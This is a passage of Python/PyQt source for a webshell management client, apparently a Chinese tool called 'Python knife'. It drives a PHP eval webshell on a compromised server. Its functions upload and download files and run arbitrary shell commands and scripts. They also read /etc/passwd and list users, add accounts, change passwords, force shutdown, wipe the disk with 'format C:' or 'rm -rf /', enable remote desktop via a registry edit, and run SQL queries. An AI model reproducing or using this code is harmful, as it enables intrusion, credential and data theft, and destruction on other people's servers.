            size = round(size / 1048576, 2)
            return str(size) + " MB"
        elif size > 107374824:
            size = round(size / 1073741824, 2)
            return str(size) + " GB"
        else:
            pass
  #文件打开对话框
    def fileopen(self):
        fileName, selectedFilter = QFileDialog.getOpenFileName(self,(r"上传文件"),(r"C:\windows"),r"All files(*.*);;Text Files (*.txt);;PHP Files (*.php);;ASP Files (*.asp);;JSP Files (*.jsp);;ASPX Files (*.aspx)")

        return (fileName)  #返回文件路径
  #保存文件对话框
    def filesave(self,filename):

        fileName, filetype= QFileDialog.getSaveFileName(self, (r"保存文件"), (r'C:\Users\Administrator\\'+ filename), r"All files(*.*)")
        #print(fileName)
        return fileName
    ##文件上传
    def File_upload(self):
        # 尝试获取文件路径
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            try:
                fileName =  self.fileopen()   #调用文件打开对话框
                #print(type(fileName))
                #print(fileName)
                # 尝试打开文件读取数据
                f = open(fileName,"rb")
                fsize = os.path.getsize(fileName) #获取文件大小
                filedata = f.read()
                f.close()
                shell = shell.split("     ")
                #print(fsize)
                #print(filedata)
                #z2 = base64.b64encode(filedata)
                newfileName=fileName.split("/")
                #print(newfileName[-1])
                path=self.showfilepath("treeWidget")+"/"+newfileName[-1]
                #print(path)
                #shell = self.Ui.shelllabel.text()  # 获取shell
                z = r"@eval(base64_decode($_POST[z0]));"  # 文件执行代码
                z0 = base64.b64encode((str('$c=base64_decode($_POST["z2"]); echo(@fwrite(fopen("'+path+'","w"),$c));die();')).encode('utf-8'))

                #z1 = base64.b64encode((str(path)).encode('utf-8')) # 文件路径加密
                #print(filedata)
                z2 = base64.b64encode(filedata)  # 文件数据加密
                #print(z0)
                #print(z1)
                #print(z2)
                data = {shell[1]:z,"z0":z0,"z2":z2}
                #print(data)
                result =self.sendPOST(shell,data)
                #print(result)
                result = result.decode('utf-8',"ignore")
                #print(type(result))
                #print(result)#
                if int(result)==fsize:
                    self.displayfile()  #刷新显示
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "上传成功!\n上传路径: "+path)
                else:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "上传失败!")
            except:
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "出现错误，上传失败！")
        else:
            box = QtWidgets.QMessageBox()
            # self.statusBar().showMessage(shell )  # 状态栏显示信息
            box.information(self, "提示", "请先连接shell！")
    #下载文件
    def File_download(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":  #判断是否连接shell
            try:
                path =self.showfilepath("treeWidget")  #获取文件的路径
                filepath = self.Ui.treeWidget_2.currentItem().text(0)  #获取文件名
                if '.' not in filepath:
                    box = QtWidgets.QMessageBox()
                    # self.statusBar().showMessage(shell )  # 状态栏显示信息
                    box.information(self, "提示", "文件夹不能下载！")
                else:
                    compath = path+"/"+filepath  #组合路径
                    phpcode = '$F = "' + compath + '";$fp=@fopen($F,"rb") or die("Unable to open file!") ;echo @fread($fp,filesize($F));@fclose($fp);die();'
                    #print(filepath)
                    #print(compath)
                    #print(phpcode)
                    returndata = self.sendcode(phpcode)  #尝试下载文件
                    #print(returndata)
                    #写入文件
                    #print(returndata)
                    if returndata != "" and returndata != "Unable to open file!":
                        savefilepath = self.filesave(filepath)
                        #print(filepath)
                        #print(savefilepath)
                        f = open(savefilepath, "wb")  # 打开文件
                        f.write(returndata)  # 写入文件
                        f.close()  # 关闭文件
                        box = QtWidgets.QMessageBox()
                        # self.statusBar().showMessage(shell )  # 状态栏显示信息
                        box.information(self, "提示", "下载成功！")
                    else:
                        box = QtWidgets.QMessageBox()
                        # self.statusBar().showMessage(shell )  # 状态栏显示信息
                        box.information(self, "提示", "下载失败！")
            except:
                box = QtWidgets.QMessageBox()
                # self.statusBar().showMessage(shell )  # 状态栏显示信息
                box.information(self, "提示", "下载失败！")
        else:
            box = QtWidgets.QMessageBox()
            # self.statusBar().showMessage(shell )  # 状态栏显示信息
            box.information(self, "提示", "请先连接shell！")

    #文件删除
    def File_delete(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell !="":
            try:
                path = self.showfilepath("treeWidget")  # 获取文件的路径
                filepath = self.Ui.treeWidget_2.currentItem().text(0)  # 获取文件名
                compath = path + "/" + filepath  # 组合路径
                #print(compath)
                hitgroup= self.Ui.treeWidget_2.currentIndex().row()
                #删除文件
                shell = shell.split("          ")
                system = self.systemtype()
                #print(system)
                if system == "WINNT":
                    compath = compath.replace('/', '\\')  # 将/替换为\ windwos下不能使用/
                    if compath[-1] =='.' or compath[-2] =='.' or compath[-3] =='.' or compath[-4] =='.' :
                        phpcode = "system('" + "del /S /Q " + compath + "&&echo ok');"
                    else:
                        phpcode = "system('" + "rd /S /Q " + compath + "&&echo ok');"
                    returnresult=self.sendcode(phpcode).decode('utf-8',"ignore").strip()  #删除空格及换行符
                    if "ok" in returnresult:
                        returnresult="ok"
                if system == "Linux":
                    #phpcode = "system('whoami');"  #
                    phpcode="system('rm -rf "+compath+"&&echo ok');"#
                    #print(phpcode)
                    returnresult = self.sendcode(phpcode).decode('utf-8',"ignore").strip() #删除空格及换行符
                if returnresult =="ok":
                    self.Ui.treeWidget_2.takeTopLevelItem(hitgroup)  #删除节点
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "删除成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "您没有权限！")
            except:
                pass
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

   #重命名对话框显示
    def renameshow(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
            if index != None:
                self.rename = Ui_renameForm()
                self.dialog = QtWidgets.QDialog(self)
                self.rename.setupUi(self.dialog)
                self.dialog.show()
                self.rename.renameButton.clicked.connect(self.File_rename)
            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "请选择要重命名的项！")
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    #重命名确定按钮
    def File_rename(self):
        #hitgroup = self.Ui.treeWidget_2.currentIndex().row()#获取要修改的行号
        renamefile = self.rename.renameedit.text() #获取要修改的文件名
        #print(renamefile)
        parentpath= self.showfilepath("treeWidget")  #获取路径
        #print(parentpath)
        index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
        filename = index.text(0)  # 获取文件名
        system = self.systemtype()
        if system == "WINNT":
            path = parentpath +'\\'+ filename  # 组合路径
            path =path.replace('/','\\')
            phpcode = 'system("rename ' + path + ' ' + renamefile + '");if(file_exists("'+parentpath+'/'+renamefile+'")){echo("ok");}else{echo("false");}'  # 重命名
        if system == "Linux":
            phpcode = 'system("cd '+parentpath+'&&mv '+filename+' '+renamefile+'");if(file_exists("'+parentpath+'/'+renamefile+'")){echo("ok");}else{echo("false");}'  # 重命名
        print(phpcode)
        returndata=  self.sendcode(phpcode)  #发送数据

        returndata = returndata.decode('utf-8',"ignore")
        #print(returndata)
        if returndata == "ok":
            self.dialog.close()  # 关闭子窗口
            self.displayfile()    #刷新显示
        if returndata == "false":
            box = QtWidgets.QMessageBox()
            box.information(self, "重命名", "重命名失败！")
            self.dialog.close()  # 关闭子窗口
            self.displayfile()    #刷新显示
    #虚拟终端
    def Virtualshell(self):
        #self.Ui.textEdit.setReadOnly(True)  #设置textRdit不可编辑
        system = self.systemtype()  #判断系统类型
        if system == "WINNT":
            phpcode = "system('chdir');"
        if system == "Linux":
            phpcode = "system('pwd');"
        data = self.sendcode(phpcode)
        data = data.decode('gbk', "ignore")  # 解码utf8，忽略其中有异常的编码，仅显示有效的编码
        #print(data)
        self.Ui.textEdit.clear()
        self.Ui.textEdit.append(data.strip().strip('\r\n').strip('\n').strip('\r')+'>')
        # cursor= self.Ui.textEdit.textCursor()
        # cursor.movePosition(QtGui.QTextCursor.End)
        # self.Ui.textEdit.setTextCursor(cursor)

        # self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End)   #光标移动到最后

     #重写键盘事件 判断enter
    def eventFilter(self,watched, event):
        if watched == self.Ui.textEdit:
            if event.type() == QEvent.KeyPress and (event.key() == Qt.Key_Enter or event.key() == Qt.Key_Return):
                shell = self.Ui.shelllabel.text()  # 获取shell

                if shell != "":
                    shellcode = self.Ui.textEdit.toPlainText()  # 获取内容
                    shellcode2 = shellcode.split('>')
                    path = str(shellcode2[-2]).split('\n')[-1]  # 取出路径
                    #快捷键clear 清空文档
                    #print(shellcode2)
                    if shellcode2[-1] == 'clear' or shellcode2[-1] == 'Clear':
                        self.Ui.textEdit.clear()
                        self.Ui.textEdit.append(path.strip().strip('\r\n').strip('\n').strip('\r')+'>')

                        #self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End,QTextCursor.MoveAnchor)  # 光标移动到最后
                        if shellcode2[-1] != '' and shellcode2[-1] != '\n':
                            # print(shellcode2[-1])
                            self.Ui.history.addItem(shellcode2[-1])  # 为history添加历史命令
                    else:
                        self.Virtualshellgo()
                else:
                    pass
                return False
            else:
                return False


    #获取linux根目录
    def getCatalog(self):
        result3 = []
        code = "system('cd /&&ls');"
        result = self.sendcode(code).decode('gbk', "ignore")
        result2 =result.split('\n')[:-1]
        for  i  in result2:
            result3.append('/'+i)
        return result3
    # 获取远程主机的所有盘符
    def getpan(self):
        pancode = "exec('wmic LOGICALDISK get name',$dir);print_r($dir);"
        pan = self.sendcode(pancode).decode('gbk', "ignore")
        pan = pan.split('\n    ')
        pan = pan[1:-1]
        panlist = []
        for i in pan:
            panlist.append(i[-2:])

        return panlist

    def Virtualshellgo(self):
        # 获取框里的输入文本
        shellcode = self.Ui.textEdit.toPlainText()  # 获取内容
        shellcode2 = shellcode.split('>')
        path = str(shellcode2[-2]).split('\n')[-1]  # 取出路径
        # print(shellcode2[1])
        # print(path)
        # print(shellcode2[-1])  #历史命令
        if path == '':
            path = shellcode2[1]
        # print(path)
        # 判断是否有输入
        if shellcode2[-1] != '':
            # print(shellcode2[-1])
            # print(shellcode2[-2])
            # print(shellcode2[-2][3:])
            system = self.systemtype()  #得到系统类型
            if system == "WINNT":
                cmd = "chdir"
                phpcode = "system('cd /d " + path + '&' + shellcode2[-1] + "&" + cmd + "');"
            if system == "Linux":
                cmd = "pwd"
                phpcode = "system('cd " + path + '&&' + shellcode2[-1] + "&&" + cmd + "');"
            # print(path)
            panlist= self.getpan()  #得到所有盘符
            if shellcode2[-1] in panlist:
                self.Ui.textEdit.append(shellcode2[-1] + '\>')
            if shellcode2[-1] == 'cd ..':  # 判断输入的命令是不是cd ..
                if cmd =='chdir':
                    fuhao = "\\"
                if cmd =='pwd':
                    fuhao='/'
                path2 = path.split(fuhao)
                path2 = path2[0:-1]
                path = fuhao.join(path2)
                self.Ui.textEdit.append(path + '>')
                if shellcode2[-1] != '' and shellcode2[-1] != '\n':
                    # print(shellcode2[-1])
                    self.Ui.history.addItem(shellcode2[-1])  # 为history添加历史命令
                # print(path)

            #print(panlist)
            else:
                # print(path)
                #print(phpcode)
                returncommand = self.sendcode(phpcode)
                if returncommand != None:
                    returncommand = returncommand.decode('gbk', "ignore")  # 解码utf8，忽略其中有异常的编码，仅显示有效的编码
                    # print(returncommand)
                    data = returncommand.strip().strip('\r\n').strip('\n').strip('\r')  # 需要设置的数据
                    # print(data)
                    self.Ui.textEdit.append(data +'>')
                    # self.Ui.textEdit.moveCursor(QTextCursor.Start)
                    # self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End,QTextCursor.MoveAnchor)  # 光标移动到最后
                    if shellcode2[-1] != '' and shellcode2[-1] != '\n':
                        # print(shellcode2[-1])
                        self.Ui.history.addItem(shellcode2[-1])  # 为history添加历史命令
                else:
                    pass
        else:
            self.Ui.textEdit.append(path.strip().strip('\r\n').strip('\n').strip('\r') + '>')
            # self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End)  # 光标移动到最后
    #给代码加密并发送
    def sendcode(self,phpcode):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            shell = shell.split("     ")
            phpcode = base64.b64encode(phpcode.encode('utf-8'))
            #print(phpcode)
            #phpcode = str(base64.b64encode(phpcode.encode('utf-8')), 'utf-8')
            data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}
            #print(data)
            return self.sendPOST(shell, data)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    #保存脚本
    def SaveJiaoben(self):
        data  = self.Ui.textEdit_3.toPlainText()  #获取textEdit_3的内容
        if data != "":
            try:
                path = self.filesave("jiaoben.txt")
                f= open(path,"w",encoding='utf-8')
                f.write(data)
                f.close()
            except:
                pass
        else:
            box = QtWidgets.QMessageBox()
            box.warning (self, "警告", "您未输入任何字符！")
    #脚本清空按钮
    def ClearJiaoben(self):
        self.Ui.textEdit_3.clear()
    ##载入脚本
    def ZairuJiaoben(self):
        try:
            filename = self.fileopen()   #文件打开对话框，并获取文件路径
            f = open(filename, "r")   #打开文件
            filedata = f.read()    #读取数据
            f.close()   #关闭文件
            self.Ui.textEdit_3.clear()  #清空文本
            self.Ui.textEdit_3.setText(filedata)   #设置文本
        except:
            pass
    #执行脚本
    def ZhixingJiaoben(self):
        scriptdata = self.Ui.textEdit_3.toPlainText()  #获取输入的脚本内容
        type = self.Scripttype()   #判断选择的脚本类型
        shell = self.Ui.shelllabel.text()  # 获取shell
        shell = shell.split("     ")
        system = self.systemtype()  # 获取系统类型
        if shell[2]=="PHP":
            try:
                if type == "PHP":
                    data = self.sendcode(scriptdata)   #发送数据，返回结果
                    data = data.decode('utf-8', "ignore")
                    data = self.zhixingcuowu(data) #判断是否错误
                    self.Ui.jiaobenjieguo.setText(data)  #设置结果
                if type == "ASP":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "PHP语言不能执行ASP脚本！")
                if type == "JSP":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "PHP语言不能执行JSP脚本！")
                if type == "BASH" and system == "Linux":
                    #phpcode = "system('cd /tmp&&touch 1.sh&&" + scriptdata + ">>1.sh&&/bin/bash 1.sh');"
                    phpcode='fwrite(fopen("/tmp/1.sh","w"),"'+scriptdata+'");die();system("/bin/bash 1.sh");'
                    data = self.sendcode(phpcode)
                    data = data.decode('utf-8', "ignore")
                    data = self.zhixingcuowu(data) #判断是否错误
                    self.Ui.jiaobenjieguo.setText(data)  # 设置结果
                if type == "Bat" and system == "WINNT":
                    phpcode = 'fwrite(fopen("C:\\Users\Public\\\\1.bat","w"),"'+scriptdata+'");die();system("C:\\Users\Public\\\\1.bat");'
                    # print(phpcode)
                    data = self.sendcode(phpcode)
                    data = data.decode('utf-8', "ignore")
                    data = self.zhixingcuowu(data) #判断是否错误
                    self.Ui.jiaobenjieguo.setText(data)  # 设置结果
                if type == "Python":
                    if system == "WINNT":
                        phpcode = 'fwrite(fopen("C:\\Users\Public\\\\1.py","w"),"' + scriptdata + '");die();system("python3 C:\\Users\Public\\\\1.py");'
                    if system == "Linux":
                        phpcode = 'fwrite(fopen("/tmp/1.py","w"),"' + scriptdata + '");die();system("python3 1.py");'
                    # print(phpcode)
                    data = self.sendcode(phpcode)
                    data = data.decode('utf-8', "ignore")
                    data = self.zhixingcuowu(data) #判断是否错误
                    self.Ui.jiaobenjieguo.setText(data)  # 设置结果
                if type == "BASH" and system == "WINNT":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "Windows系统不支持bash脚本！")
                if type == "Bat" and system == "Linux":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "Linux系统不支持shell脚本！")
            except:
                box = QtWidgets.QMessageBox()
                box.warning(self, "警告", "类型选择错误！")

        if shell[2] == "ASP":
            try:
                if type == "PHP":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "ASP语言不能执行PHP脚本！")
                if type == "ASP":
                        pass
                if type == "JSP":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "ASP语言不能执行JSP脚本！")
                if type == "BASH" and system == "Linux":
                    pass
                if type == "Bat" and system == "WINNT":
                    pass
                if type == "Python":
                    pass
                if type == "Bash" and system == "WINNT":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "Windows系统不支持bash脚本！")
                if type == "Bat" and system == "Linux":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "Linux系统不支持Bat脚本！")
            except:
                box = QtWidgets.QMessageBox()
                box.warning(self, "警告", "类型选择错误！")

        if shell[2] == "JSP":
            try:
                if type == "PHP":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "JSP语言不能执行PHP脚本！")
                if type == "ASP":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "JSP语言不能执行ASP脚本！")
                if type == "JSP":
                    pass
                if type == "BASH" and system == "Linux":
                    pass
                if type == "Bat" and system == "WINNT":
                    pass
                if type == "Python":
                    pass
                if type == "BASH" and system == "WINNT":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "Windows系统不支持bash脚本！")
                if type == "Bat" and system == "Linux":
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "Linux系统不支持Bat脚本！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "警告", "类型选择错误！")
            except:
                box = QtWidgets.QMessageBox()
                box.warning(self, "警告", "类型选择错误！")
    def zhixingcuowu(self,data):
        if 'Parse error' in data:
            return '脚本执行错误！'
        else:
            return '脚本执行完成！\n'+data

    # 判断脚本类型
    def Scripttype(self):
        if self.Ui.PHP.isChecked() == True:
            return 'PHP'
        if self.Ui.BASH.isChecked() == True:
            return 'BASH'
        if self.Ui.Python.isChecked() == True:
            return 'Python'
        if self.Ui.ASP.isChecked() == True:
            return 'ASP'
        if self.Ui.JSP.isChecked() == True:
            return 'JSP'
        if self.Ui.Bat.isChecked() == True:
            return 'Bat'

#数据库管理
    #sql配置子窗口显示
    def Sql_peizhi_show(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            self.sqlpeizhi = Ui_sql_peizhi()
            self.dialog = QtWidgets.QDialog(self)
            self.sqlpeizhi.setupUi(self.dialog)
            self.dialog.show()
            self.sqlpeizhi.sql_peizhi_ok.clicked.connect(self.Sql_peizhi_ok_pushbutton)
            #读取数据库信息
            with open('database.csv') as f:
                reader = csv.reader(f)
                peizhi = [row[1] for row in reader]
            #设置数据库子窗口默认值
            self.sqlpeizhi.sql_name_edit.setText(peizhi[0])
            self.sqlpeizhi.sql_passwd_edit.setText(peizhi[1])
            self.sqlpeizhi.sql_database_edit.setText(peizhi[2])
            #设置子窗口数据库类型默认值
            if peizhi[3]=="MYSQL":
                self.sqlpeizhi.sql_type.setCurrentIndex(0);
            if peizhi[3]=="MSSQL":
                self.sqlpeizhi.sql_type.setCurrentIndex(1);
            if peizhi[3]=="ORACLE":
                self.sqlpeizhi.sql_type.setCurrentIndex(2);
            if peizhi[3]=="ACCESS":
                self.sqlpeizhi.sql_type.setCurrentIndex(3);
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    ##sql配置确定按钮
    def Sql_peizhi_ok_pushbutton(self):
        username = self.sqlpeizhi.sql_name_edit.text()  # 获取sql配置对话框用户名
        passwd = self.sqlpeizhi.sql_passwd_edit.text()  # 获取sql配置对话框密码
        database = self.sqlpeizhi.sql_database_edit.text()  # 获取sql配置对话框数据库名
        sqltype = self.sqlpeizhi.sql_type.currentText()  # 获取数据库类型
        # print(sqltype)
        self.dialog.close()
        datas = [['username', username],
                 ['passwd', passwd],
                 ['database', database],
                 ['sqltype', sqltype],]
        # print(datas)
        #写入到csv文件
        with open('database.csv', 'w', newline='') as f:
            writer = csv.writer(f)
            for row in datas:
                writer.writerow(row)
        f.close()
    ##sql语句执行
    def Sql_ok(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            sql = self.Ui.sql_yuju.text()  #获取sql语句
            if sql!="":
                #使用数据库
                if sql[0:3] == "use":
                    sql = sql.split(" ")
                    # peizhi[3] =
                    content=[]
                    #将数据库信息更新
                    with open('database.csv','r') as csvfile:
                        rows = csv.reader(csvfile)
                        for line in rows:
                            content.append(line)
                        content[2][-1]=sql[1][0:-1]
                    csvfile.close
                    # print(content)
                    with open('database.csv','w',newline='') as f:
                        # 写入到csv文件
                        writer = csv.writer(f)
                        for row in content:
                            writer.writerow(row)
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "当前数据库设置为"+content[2][-1]+"！")

                else:
                    #读取数据库配置
                    with open('database.csv') as f:
                        reader = csv.reader(f)
                        peizhi = [row[1] for row in reader]
                    # print(peizhi)
                    if peizhi[-1]=="MYSQL":
                        phpcode ='$link=new mysqli("127.0.0.1","'+peizhi[0]+'","'+peizhi[1]+'","'+peizhi[2]+'");if(mysqli_connect_error()){echo "连接失败";exit();}$sql="'+sql+'";$res=$link->query($sql);$data=$res->fetch_all();var_dump($data);'
                        # print(phpcode)
                        data = self.sendcode(phpcode)
                        data = data.decode('utf-8', "ignore")
                        #正则表达式取出双引号之间的数据
                        pattern = re.compile('"(.*)"')
                        data = pattern.findall(data)
                        #print(data)
                        if "连接失败" in str(data):
                            box = QtWidgets.QMessageBox()
                            box.information(self, "提示", "连接失败！")
                        else:
                            self.Ui.sql_textEdit.clear()

                            for i in data:
                                self.Ui.sql_textEdit.append(i)
                    if peizhi[-1]=="MSSQL":
                        pass
                    if peizhi[-1]=="ORACLE":
                        pass
                    if peizhi[-1]=="ACCESS":
                        pass
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
        #查询用户按钮
    def User(self,num=1):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell == "":
            box = QtWidgets.QMessageBox()
            box.warning(self, "提示", "请先连接shell！")
        else:
            system = self.systemtype()  # 获取系统类型
            user = ""
            if system == "WINNT":
                phpcode = 'system("net user");'
                #print(phpcode)
                data = self.sendcode(phpcode)
                #print(data)
                #print(data[113:-20])
                if data !=None:
                    data = data.decode('gbk', "ignore")
                    #print(data)
                    data =data.split('-------------------------------------------------------------------------------')
                    #print(data[1])
                    data=data[1].replace('\r\n', '').split(" ")
                    #print(data)
                    # #print(data)
            if system == "Linux":
                phpcode = 'system("cat /etc/passwd |cut -f 1 -d :");'  # 组合命令
                data = self.sendcode(phpcode).decode('utf-8')
                data=data.split("\n")
            # print(num)

            if num ==2 :
                userlist= []
                for i in data[:-1]:
                    if i !="":
                        userlist.append(i[:-1])
                return userlist
            else:
                for i in data[:-1]:
                    if i !="":
                        user += "用户："+i+"\n"
                #print(user)
                box = QtWidgets.QMessageBox()
                box.about (self, "查询用户", user[:-1])

    #添加用户按钮
    def Adduser(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        username = self.adduser.userEdit.text()  #获取添加用户对话框用户名
        #print(username)
        password = self.adduser.passwordEdit.text() #获取添加用户对话框密码
        system = self.systemtype()  # 获取系统类型
        if system == "WINNT":
            phpcode = 'system("net user '+username+" "+password+" "+'/add");' #组合命令
            returndata  = self.sendcode(phpcode)    #发送命令
            if returndata !="":
                self.dialog.close()
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "添加成功！")
            else:
                self.dialog.close()
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "添加失败！")
        if system == "Linux":
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "暂不支持Linux！")
            #     passwd=crypt.crypt(password, 'HX')
            #     phpcode = 'system("useradd  -p "'+passwd+'"'+username+'");'  # 组合命令
        #print(username)
        #print(password)
        #print(returndata)
        #print(data)
    #修改密码按钮调用的函数
    def Changepasswd(self):
        username = self.changepasswd.listWidget.currentItem().text()   #获取修改密码窗口的用户名
        passwd = self.changepasswd.changepasswordEdit.text() #获取修改密码窗口的密码
        #print(username)
        #print(passwd)
        if passwd !='':
            system = self.systemtype()  # 获取系统类型
            if system == "WINNT":
                phpcode = 'system("net user ' + username + " " + passwd + '" );'  # 组合命令
            if system == "Linux":
                phpcode = 'system("echo ' + username + ":" + passwd + '" | chpasswd);'  # 组合命令
            #print(phpcode)
            returndata = self.sendcode(phpcode)  # 发送命令
            returndata = returndata.decode('gb2312',"ignore")
            #print(returndata)
            #print(returndata[:6])
            #print(type(returndata))
            if returndata[:6] =="命令成功完成":
                self.dialog.close()
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "修改成功！")
            else:
                self.dialog.close()
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "没有此用户或没有权限，修改失败！")
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "密码不能为空！")

    #强制关机按钮
    def Shutdown(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            button = QMessageBox.question(self, "警告！",
                                          self.tr("你确定要强制关机吗？"),
                                          QMessageBox.Ok | QMessageBox.Cancel,
                                          QMessageBox.Ok)
            if button == QMessageBox.Ok:

                shell = self.Ui.shelllabel.text()  # 获取shell
                system = self.systemtype()  # 获取系统类型
                if system == "WINNT":
                    phpcode = 'system("shutdown -p");echo(ok);'
                if system == "Linux":
                    phpcode = 'system("poweroff");echo(ok);'
                data = self.sendcode(phpcode)
                data = data.decode('utf-8',"ignore")
                #print(data)
                if data!=None:
                    if data == "ok":
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "强制关机成功！")
                    else:
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "强制关机失败！")
                else:
                    pass
                #print(data)
            else:
                return
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    #格式化c盘
    def Format(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            data = QMessageBox.question(self, "警告！",
                                          self.tr("你确定要这么做吗，这将不可恢复？"),
                                          QMessageBox.Ok | QMessageBox.Cancel,
                                          QMessageBox.Ok)
            if data == QMessageBox.Ok:
                system = self.systemtype()  # 获取系统类型
                if system == "WINNT":
                    phpcode = 'system("format C:");echo(ok);'
                if system == "Linux":
                    phpcode = 'system("rm -rf /");echo(ok);'
                shell = shell.split("          ")  # 分割字符串写到shell列表
                phpcode = base64.b64encode(phpcode.encode('GB2312'))
                data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                        'z0': phpcode}
                returndata = self.sendPOST(shell,data)
                if returndata == 'ok':
                    box = QtWidgets.QMessageBox()
                    box.about(self, "提示", "操作成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.about(self, "提示", "操作失败！")
            else:
                return

        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    #开启3389按钮
    def Open3389(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell == "":
            box = QtWidgets.QMessageBox()
            box.warning(self, "提示", "请先连接shell！")
        else:

            system = self.systemtype()  # 获取系统类型
            if system == "WINNT":
                phpcode ='system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");'
                result = self.sendcode(phpcode)
                if result !=None:
                    data = self.sendcode('system("netstat -ano |findstr 0.0.0.0:3389");')
                    data = data.decode('utf-8',"ignore")
                    if data !=None:
                        if data!="":
                            box = QtWidgets.QMessageBox()
                            box.information(self, "提示", "开启成功！")
                        else:
                            box = QtWidgets.QMessageBox()
                            box.information(self, "提示", "抱歉，您没有权限！")
                    else:
                        return
                else:
                    return
            if system == "Linux":
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "此操作只支持Windows！")


    #中文检测
    def Chinese(self):
        try:
            os.system("python 中文符号检测工具.py")
        except:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "模块不存在！")
    #检查更新
    def Update(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"  # 以表单的形式请求
        }
        url =  'http://129.204.113.202/1.txt'
        req = urllib.request.Request(url,headers=headers)
        # 发起请求
        response = urllib.request.urlopen(req)
        data = (response.read())
        data = data.decode('utf-8', "ignore")
        # print(data)
        if "V5.0\n" ==data or "V5.0" ==data  :
            box = QtWidgets.QMessageBox()
            box.about (self, "检查更新", "当前版本：V5.0\n最新版本："+data+"\n恭喜您,您使用的是最新版本！")
        else:
            data = QMessageBox.question(self, "检查更新！",
                                        self.tr("您使用的不是最新版本，\n您想要立即更新吗？"),
                                        QMessageBox.Ok | QMessageBox.Cancel,
                                        QMessageBox.Ok)
            if data == QMessageBox.Ok:
                webbrowser.open(
                    "https://github.com/qianxiao996/Python3/tree/master/python%E8%84%9A%E6%9C%AC/Python%20knife")
            else:
                return

    #联系作者
    def Loveme(self):
        webbrowser.open("http://qianxiao996.vip")
        box = QtWidgets.QMessageBox()
        box.information (self, "联系作者", "作者邮箱：qianxiao996@126.com\n作者主页：http://qianxiao996996.cn")

    # POST请求
    def sendPOST(self,shell,phpcode): #发送php请求
       #请求头
        headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded" #以表单的形式请求
        }
        #print(phpcode)
        #print(shell[0])
        #print(phpcode)

        postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")

        req = urllib.request.Request(shell[0], postData, headers,)

        try:
        # 发起请求
            response = urllib.request.urlopen(req,timeout=0.5)
            data = (response.read())
            #print(data)
            return (data)
        except urllib.error.HTTPError as e:
            return e.code


    # 重载关闭事件  将tableweight写入txt文件
    def closeEvent(self, event):
        data=[]
        comdata = []
        for i in range(0,self.Ui.tableWidget.rowCount()):   #循环行
